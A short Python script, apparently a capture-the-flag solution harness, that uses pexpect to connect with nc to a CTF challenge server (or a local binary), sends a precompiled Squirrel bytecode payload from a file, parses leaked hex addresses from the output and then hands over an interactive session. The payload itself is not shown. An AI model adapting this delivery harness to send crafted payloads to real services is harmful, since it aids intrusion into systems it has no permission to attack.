from pexpect import spawn

p = spawn('/bin/bash', echo = False)
p.sendline('stty raw lnext ^- opost')
if 0:
    p.sendline('./sq;exit')
else:
    p.sendline('nc hax1.allesctf.net 9888;exit')
    
with open('out.cnut', 'rb') as fi:
    payload = bytes(fi.read())

print(f'Reading {len(payload)} bytes')

p.sendline(str(len(payload)+1)) # doesn't work without the +1?
p.sendline(payload)

# remove superfluous output
p.expect(': 0x(.*?)\).*?0x(.*?)\)')
p.sendline()
p.sendline()

p.interact()